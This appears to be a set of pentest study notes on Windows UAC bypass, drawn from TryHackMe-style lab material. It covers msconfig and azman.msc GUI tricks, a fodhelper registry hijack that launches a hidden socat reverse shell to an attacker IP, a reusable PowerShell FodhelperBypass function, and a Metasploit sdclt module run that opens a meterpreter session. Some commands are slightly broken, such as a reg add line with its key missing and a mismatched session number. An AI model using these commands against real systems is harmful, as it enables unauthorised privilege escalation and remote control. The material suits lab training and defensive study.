
## With GUI access
### 1. Using msconfig
Our goal is to obtain access to a High IL command prompt without passing through UAC. First, let's start by opening msconfig, either from the start menu or the "Run" dialog:  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/30570f96439f9de572fe97ba508ccdfa.png)

If we analyze the msconfig process with Process Hacker (available on your desktop), we notice something interesting. Even when no UAC prompt was presented to us, msconfig runs as a high IL process:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/478a3577ffcd0c186529d9edd34545f4.png)  

This is possible thanks to a feature called auto elevation that allows specific binaries to elevate without requiring the user's interaction. More details on this later.

If we could force msconfig to spawn a shell for us, the shell would inherit the same access token used by msconfig and therefore be run as a high IL process. By navigating to the Tools tab, we can find an option to do just that:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/efbc49a8c7acfe3f296d0cb46cd2f75a.png)  

If we click Launch, we will obtain a high IL command prompt without interacting with UAC in any way.

### 2. Using azman.msc
As with msconfig, azman.msc will auto elevate without requiring user interaction. If we can find a way to spawn a shell from within that process, we will bypass UAC. Note that, unlike msconfig, azman.msc has no intended built-in way to spawn a shell. We can easily overcome this with a bit of creativity.

First, let's run azman.msc:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/769ef59be8fc62884e69a0b39422b2a5.png)  

We can confirm that a process with high IL was spawned by using Process Hacker. Notice that all .msc files are run from mmc.exe (Microsoft Management Console):

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2fd110f80a236ea5bbb06518b519b440.png)  

To run a shell, we will abuse the application's help:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2f1aef0aa39ffcf9056999c939e43b8d.png)  

On the help screen, we will right-click any part of the help article and select **View Source**:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/43e3967d4cdb4c30dc46e7ce81eb2825.png)  

This will spawn a notepad process that we can leverage to get a shell. To do so, go to **File->Open** and make sure to select **All Files** in the combo box on the lower right corner. Go to `C:\Windows\System32` and search for `cmd.exe` and right-click to select Open:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8ae24b569d5d95119e79feb425e1b7ff.png)  

This will once again bypass UAC and give us access to a high integrity command prompt. You can check the process tree in Process Hacker to see how the high integrity token is passed from mmc (Microsoft Management Console, launched through the Azman), all the way to cmd.exe:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7fb637209e08c712615b992b9d0533ca.png)


## Non-GUI UAC bypass
### 1. fodhelper

Once connected, we check if our user is part of the Administrators group and that it is running with a medium integrity token:

Attacker's Shell
```
Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved.  

C:\Windows\system32>whoami 
myserver\attacker  

C:\Windows\system32>net user attacker | find "Local Group" 
Local Group Memberships      *Administrators       *Users                  

C:\Windows\system32>whoami /groups | find "Label" 
Mandatory Label\Medium Mandatory Level        Label       S-1-16-8192
```


We set the required registry values to associate the ms-settings class to a reverse shell. For your convenience, a copy of **socat** can be found on `c:\tools\socat\`. You can use the following commands to set the required registry keys from a standard command line:

Command Prompt

```
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command 

C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"  

C:\> reg add 
/v "DelegateExecute" /d "" /f 
The operation completed successfully.  

C:\> reg add %REG_KEY% /d %CMD% /f 
The operation completed successfully.
```

> Note: change the "set CMD=" to whatever payload we want to run as system 
> e.g **set CMD="powershell -windowstyle hidden c:\\temp\\shell.exe**

Notice how we need to create an empty value called **DelegateExecute** for the class association to take effect. If this registry value is not present, the operating system will ignore the command and use the system-wide class association instead.

We set up a listener by using netcat in our machine:

`nc -lvp 4444`  

And then proceed to execute **fodhelper.exe**, which in turn will trigger the execution of our reverse shell:  

![[Pasted image 20231015162741.png]]

### 2. Using PS script and fodhelper (EASIER)

1. download the following script.
2. import the module
3. run `Fodhelper -program C:\users\public\shell.exe` 
```
function FodhelperBypass(){ 
 
Param (    
 
 [String]$program = "cmd /c start powershell.exe" #default
 
      )
 
#Create registry structure
 
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
 
#Perform the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
#Remove registry structure
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 
}

### run any program using 'Fodhelper -program cmd' or 'Fodhelper -program C:\users\public\shell.exe'
# How to: https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/

```
### 2. Using Metasploit

```sh
msf6 exploit(multi/handler) > search UAC

Matching Modules
================
# Name Disclosure Date Rank
Check Description
- ---- --------------- ----
----- -----------
- ---- --------------- ----
----- -----------
0 post/windows/manage/sticky_keys normal
No Sticky Keys Persistance Module
1 exploit/windows/local/cve_2022_26904_superprofile 2022-03-17
excellent Yes User Profile Arbitrary Junction Creation Local Privilege Elevation
2 exploit/windows/local/bypassuac_windows_store_filesys 2019-08-22 manual
Yes Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
3 exploit/windows/local/bypassuac_windows_store_reg 2019-02-19 manual
Yes Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry
...
11 exploit/windows/local/bypassuac_sdclt 2017-03-17
excellent Yes Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
12 exploit/windows/local/bypassuac_silentcleanup 2019-02-24
excellent No Windows Escalate UAC Protection Bypass (Via SilentCleanup)
```


One very effective UAC bypass on modern Windows systems is **exploit/windows/local/bypassuac_sdclt**, which targets the Microsoft binary sdclt.exe. 

This binary can be abused to bypass UAC by spawning a process with integrity level High.999 To use the module, we’ll activate it and set the SESSION and LHOST options as shown in the following listing. Setting the SESSION for post-exploitation modules allows us to directly execute the exploit on the active session. Then, we can enter run to launch the module.

```sh
msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_sdclt) > show options
Module options (exploit/windows/local/bypassuac_sdclt):
Name Current Setting Required Description
---- --------------- -------- -----------
PAYLOAD_NAME no The filename to use for the payload binary
(%RAND% by default).
SESSION yes The session to run this module on
Payload options (windows/x64/meterpreter/reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------

EXITFUNC process yes Exit technique (Accepted: '', seh, thread,
process, none)
LHOST yes The listen address (an interface may be
specified)
LPORT 4444 yes The listen port
...

msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
SESSION => 32

msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.119.4
LHOST => 192.168.119.4

msf6 exploit(windows/local/bypassuac_sdclt) > run
[*] Started reverse TCP handler on 192.168.119.4:4444
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[!] This exploit requires manual cleanup of
'C:\Users\offsec\AppData\Local\Temp\KzjRPQbrhdj.exe!
[*] Please wait for session and cleanup....
[*] Sending stage (200774 bytes) to 192.168.50.223
[*] Meterpreter session 10 opened (192.168.119.4:4444 -> 192.168.50.223:49740) at
2022-08-04 09:03:54 -0400
[*] Registry Changes Removed

meterpreter >
```
